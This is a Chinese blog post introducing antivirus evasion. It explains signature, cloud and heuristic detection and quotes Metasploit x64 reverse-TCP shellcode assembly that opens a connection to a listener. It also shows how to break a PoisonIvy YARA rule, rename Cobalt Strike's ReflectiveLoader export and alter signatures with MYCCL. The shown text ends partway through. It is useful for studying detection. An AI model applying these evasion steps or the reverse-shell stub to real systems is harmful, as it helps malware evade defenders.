<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="baidu-site-verification" content="code-n4alrUzr1E" />
    <meta name="description" content="本文首发于先知社区，原文链接：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10369">
<meta property="og:type" content="article">
<meta property="og:title" content="免杀基础入门篇">
<meta property="og:url" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/index.html">
<meta property="og:site_name" content="0r@nge の窝">
<meta property="og:description" content="本文首发于先知社区，原文链接：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10369">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014013837846.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015152497.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015346016.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015412250.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015433901.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015458302.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015552143.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014020038200.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014020052793.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012131226917.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012131218800.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012131521189.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014111540437.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012232906258.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012232942431.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014115158319.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012234041565.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014103917056.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014103942943.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211013000137040.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211013000204080.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211013003245103.png">
<meta property="og:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211013003337672.png">
<meta property="article:published_time" content="2021-10-28T02:38:10.000Z">
<meta property="article:modified_time" content="2021-12-04T11:56:55.095Z">
<meta property="article:author" content="0r@nge">
<meta property="article:tag" content="免杀">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014013837846.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/icon.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/icon.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.jpg">
        
      
    
    <!-- title -->
    <title>免杀基础入门篇</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="0r@nge の窝" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/links">Links</a></li><!--
     --><!--
       --><li><a href="/atom.xml">RSS</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2021/10/30/%E7%AE%80%E5%8D%95DDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2021/10/25/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&text=免杀基础入门篇"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&title=免杀基础入门篇"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&is_video=false&description=免杀基础入门篇"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=免杀基础入门篇&body=Check out this article: https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&title=免杀基础入门篇"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&title=免杀基础入门篇"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&title=免杀基础入门篇"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&title=免杀基础入门篇"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&name=免杀基础入门篇&description=&lt;p&gt;本文首发于先知社区，原文链接：&lt;a href=&#34;https://xz.aliyun.com/t/10369&#34;&gt;https://xz.aliyun.com/t/10369&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&t=免杀基础入门篇"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E9%9D%99%E6%80%81%E6%9F%A5%E6%9D%80"><span class="toc-number">2.</span> <span class="toc-text">0x01 静态查杀:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%89%B9%E5%BE%81%E7%A0%81%E8%AF%86%E5%88%AB"><span class="toc-number">2.0.1.</span> <span class="toc-text">1.特征码识别:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BA%91%E6%9F%A5%E6%9D%80"><span class="toc-number">2.0.2.</span> <span class="toc-text">2.云查杀:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%A0%A1%E9%AA%8C%E5%92%8C%E6%B3%95"><span class="toc-number">2.0.3.</span> <span class="toc-text">3.校验和法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%90%AF%E5%8F%91%E5%BC%8F%E6%89%AB%E6%8F%8F%EF%BC%9A"><span class="toc-number">2.0.4.</span> <span class="toc-text">4.启发式扫描：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#yara%E8%A7%84%E5%88%99%EF%BC%9A"><span class="toc-number">2.0.5.</span> <span class="toc-text">yara规则：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">静态免杀方法:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MYCCL%E6%9F%A5%E6%89%BE%E7%89%B9%E5%BE%81%E7%A0%81%E4%BF%AE%E6%94%B9%EF%BC%9A"><span class="toc-number">3.0.1.</span> <span class="toc-text">MYCCL查找特征码修改：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9shellcode%E8%BF%9B%E8%A1%8C%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81"><span class="toc-number">3.0.2.</span> <span class="toc-text">对shellcode进行加密编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%8A%A8%E6%80%81%E6%9F%A5%E6%9D%80%EF%BC%88%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">0x02 动态查杀（主动防御）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9B%B8%E5%85%B3"><span class="toc-number">4.1.</span> <span class="toc-text">计算机相关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3"><span class="toc-number">4.2.</span> <span class="toc-text">网络相关</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84"><span class="toc-number">5.</span> <span class="toc-text">payload基本结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80"><span class="toc-number">6.</span> <span class="toc-text">分离免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        免杀基础入门篇
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">0r@nge</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-10-28T02:38:10.000Z" itemprop="datePublished">2021-10-28</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E5%85%8D%E6%9D%80/">免杀</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a>
    </div>



    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>本文首发于先知社区，原文链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10369">https://xz.aliyun.com/t/10369</a></p>
<span id="more"></span>

<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>浅析杀软原理及一些绕过思路，也是我自己学习的一点笔记和思路。</p>
<p>杀软原理：</p>
<h3 id="0x01-静态查杀"><a href="#0x01-静态查杀" class="headerlink" title="0x01 静态查杀:"></a>0x01 静态查杀:</h3><h5 id="1-特征码识别"><a href="#1-特征码识别" class="headerlink" title="1.特征码识别:"></a>1.特征码识别:</h5><p>杀软有自己的病毒库，里面有很多样本，扫描时会抽取扫描对象的一段特征并与病毒库里作比较，如果匹配，那就会认为是病毒。抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面又不要有太大的空间与时间的开销。如果一种病毒的特征代码增长一字节，要检测3000种病毒，增加的空间就是3000字节。在保持唯一性的前提下，尽量使特征代码长度短些，以减少空间与时间开销。</p>
<p>主要扫描的有：</p>
<p><code>hash、文件名、函数名、敏感字符串、敏感api等等</code></p>
<h5 id="2-云查杀"><a href="#2-云查杀" class="headerlink" title="2.云查杀:"></a>2.云查杀:</h5><p>云查杀的不同点在于它的病毒库是放在服务器端的，而不是本地客户端，意思是只要联网病毒库就会同步更新，这种病毒库更加强大。</p>
<h5 id="3-校验和法"><a href="#3-校验和法" class="headerlink" title="3.校验和法"></a>3.校验和法</h5><p>根据正常文件的内容，计算其校验和，定期不定期的检查文件的校验是否与正常的校验和一样。其实本质还是特征码，万变不离其宗</p>
<h5 id="4-启发式扫描："><a href="#4-启发式扫描：" class="headerlink" title="4.启发式扫描："></a>4.启发式扫描：</h5><p>但是面对未知的病毒，换个模样杀软就认不出了吗？所以安全厂商研究出了启发式算法</p>
<p>启发式则是将一类病毒总结后，归纳其特征，其后的演变都为一类病毒，这就是启发式算法。具体启发式算法可以由杀软来定，比如可以使用机器学习把家族病毒聚类，或简单的通过使用通用型yara规则，例如文件大小小于100kb，且没有图标则可以识别为病毒，以此达到查杀病毒。</p>
<p>eg：</p>
<p>这是msf的shellcode：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)</span><br><span class="line">; Compatible: Windows 7, 2003</span><br><span class="line">; Architecture: x64</span><br><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">[BITS 64]</span><br><span class="line"></span><br><span class="line">; Input: RBP must be the address of &#x27;api_call&#x27;.</span><br><span class="line">; Output: RDI will be the socket for the connection to the server</span><br><span class="line">; Clobbers: RAX, RCX, RDX, RDI, R8, R9, R10, R12, R13, R14, R15</span><br><span class="line"></span><br><span class="line">reverse_tcp:</span><br><span class="line">  ; setup the structures we need on the stack...</span><br><span class="line">  mov r14, &#x27;ws2_32&#x27;</span><br><span class="line">  push r14               ; Push the bytes &#x27;ws2_32&#x27;,0,0 onto the stack.</span><br><span class="line">  mov r14, rsp           ; save pointer to the &quot;ws2_32&quot; string for LoadLibraryA call.</span><br><span class="line">  sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData structure (+8 for alignment)</span><br><span class="line">  mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.</span><br><span class="line">  mov r12, 0x0100007F5C110002        </span><br><span class="line">  push r12               ; host 127.0.0.1, family AF_INET and port 4444</span><br><span class="line">  mov r12, rsp           ; save pointer to sockaddr struct for connect call</span><br><span class="line">  ; perform the call to LoadLibraryA...</span><br><span class="line">  mov rcx, r14           ; set the param for the library to load</span><br><span class="line">  mov r10d, 0x0726774C   ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</span><br><span class="line">  call rbp               ; LoadLibraryA( &quot;ws2_32&quot; )</span><br><span class="line">  ; perform the call to WSAStartup...</span><br><span class="line">  mov rdx, r13           ; second param is a pointer to this stuct</span><br><span class="line">  push 0x0101            ;</span><br><span class="line">  pop rcx                ; set the param for the version requested</span><br><span class="line">  mov r10d, 0x006B8029   ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )</span><br><span class="line">  call rbp               ; WSAStartup( 0x0101, &amp;WSAData );</span><br><span class="line">  ; perform the call to WSASocketA...</span><br><span class="line">  push rax               ; if we succeed, rax wil be zero, push zero for the flags param.</span><br><span class="line">  push rax               ; push null for reserved parameter</span><br><span class="line">  xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure</span><br><span class="line">  xor r8, r8             ; we do not specify a protocol</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rdx, rax           ; push SOCK_STREAM</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rcx, rax           ; push AF_INET</span><br><span class="line">  mov r10d, 0xE0DF0FEA   ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )</span><br><span class="line">  call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span><br><span class="line">  mov rdi, rax           ; save the socket for later</span><br><span class="line">  ; perform the call to connect...</span><br><span class="line">  push byte 16           ; length of the sockaddr struct</span><br><span class="line">  pop r8                 ; pop off the third param</span><br><span class="line">  mov rdx, r12           ; set second param to pointer to sockaddr struct</span><br><span class="line">  mov rcx, rdi           ; the socket</span><br><span class="line">  mov r10d, 0x6174A599   ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )</span><br><span class="line">  call rbp               ; connect( s, &amp;sockaddr, 16 );</span><br><span class="line">  ; restore RSP so we dont have any alignment issues with the next block...</span><br><span class="line">  add rsp, ( (408+8) + (8*4) + (32*4) ) ; cleanup the stack allocations</span><br></pre></td></tr></table></figure>

<p>可以看到调用了两个dll，ws2_32.dll（实现socket通信，建立攻击机与目标机器的连接），kernel32.dll（ring3级别的dll，存放在C:\windows\system32文件夹中，它控制着系统的内存管理、数据的输入输出操作与中断处理，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域）</p>
<p>重点查杀</p>
<p><code>  mov r10d, 0x0726774C   ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</code></p>
<p>为什么？还不是因为它功能强大，是很多病毒爱好者的得力助手，所以被各大杀软盯的很死。</p>
<p>同样，cs中的两个特征 </p>
<p>1.profile中的stage，我这里拿到的是apt的样本，可以看到是加密混淆后的</p>
<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014013837846.png" alt="image-20211014013837846"></p>
<p>2.导出函数 ReflectiveLoader也是在杀软的豪华套餐上的，它是用来导出反射注入的dll，可以修改这个导出函数的名称来进行绕过。</p>
<p>（程序运行时将exe、dll文件加载到内存并执行一些操作的过程，这个过程称为反射，它的优点是不落盘，直接载入目标内存中执行 ，dll放在server端，目标通过下载器直接加载到内存中执行）通常这种反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。</p>
<p>ps: 关于更多分析cobalt strike，大家可以去网上看各种魔改的文章。</p>
<h5 id="yara规则："><a href="#yara规则：" class="headerlink" title="yara规则："></a>yara规则：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">rule PoisonIvy_Generic_3 &#123;</span><br><span class="line">    meta:</span><br><span class="line">        description = <span class="string">&quot;PoisonIvy RAT Generic Rule&quot;</span></span><br><span class="line">        license = <span class="string">&quot;https://creativecommons.org/licenses/by-nc/4.0/&quot;</span></span><br><span class="line">        author = <span class="string">&quot;Florian Roth&quot;</span></span><br><span class="line">        date = <span class="string">&quot;2015-05-14&quot;</span></span><br><span class="line">        hash = <span class="string">&quot;e1cbdf740785f97c93a0a7a01ef2614be792afcd&quot;</span></span><br><span class="line">    strings:</span><br><span class="line">        $k1 = <span class="string">&quot;Tiger324&#123;&quot;</span> fullword ascii</span><br><span class="line"></span><br><span class="line">        $s2 = <span class="string">&quot;WININET.dll&quot;</span> fullword ascii</span><br><span class="line">        $s3 = <span class="string">&quot;mscoree.dll&quot;</span> fullword wide</span><br><span class="line">        $s4 = <span class="string">&quot;WS2_32.dll&quot;</span> fullword</span><br><span class="line">        $s5 = <span class="string">&quot;Explorer.exe&quot;</span> fullword wide</span><br><span class="line">        $s6 = <span class="string">&quot;USER32.DLL&quot;</span></span><br><span class="line">        $s7 = <span class="string">&quot;CONOUT$&quot;</span></span><br><span class="line">        $s8 = <span class="string">&quot;login.asp&quot;</span></span><br><span class="line"></span><br><span class="line">        $h1 = <span class="string">&quot;HTTP/1.0&quot;</span></span><br><span class="line">        $h2 = <span class="string">&quot;POST&quot;</span></span><br><span class="line">        $h3 = <span class="string">&quot;login.asp&quot;</span></span><br><span class="line">        $h4 = <span class="string">&quot;check.asp&quot;</span></span><br><span class="line">        $h5 = <span class="string">&quot;result.asp&quot;</span></span><br><span class="line">        $h6 = <span class="string">&quot;upload.asp&quot;</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="built_in">uint16</span>(<span class="number">0</span>) == <span class="number">0x5a4d</span> <span class="keyword">and</span> filesize &lt; <span class="number">500</span>KB <span class="built_in"><span class="keyword">and</span></span></span><br><span class="line">            ( </span><br><span class="line">                $k1 <span class="keyword">or</span> all <span class="built_in">of</span> ($s*) <span class="keyword">or</span> all <span class="built_in">of</span> ($h*)</span><br><span class="line">            )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单分析下这段yara规则，标记了hash，最终的匹配规则是 <code>文件大小在500kb以内 并且满足 $k1/all $s/all $h 中的任意一条</code>，即被认定是病毒。这时候就可以根据破坏相应的规则，比如大小改为500kb+，不去调用相应的dll等来 bypass。</p>
<h3 id="静态免杀方法"><a href="#静态免杀方法" class="headerlink" title="静态免杀方法:"></a>静态免杀方法:</h3><p>针对静态查杀的原理，匹配对应的特征识别为病毒，那么我们让杀软识别不出这是病毒不就可以了。给出最简单的两种方式：</p>
<h5 id="MYCCL查找特征码修改："><a href="#MYCCL查找特征码修改：" class="headerlink" title="MYCCL查找特征码修改："></a>MYCCL查找特征码修改：</h5><p>找到杀软查杀的特征码，修改，替换，编码等等在不影响程序运行的情况下，把特征码改的面目全非，删掉也可以。</p>
<p>这个工具算是很老的了，具体使用方法不再阐述。</p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015152497.png" alt="image-20211014015152497" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015346016.png" alt="image-20211014015346016" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015412250.png" alt="image-20211014015412250" style="zoom:67%;">

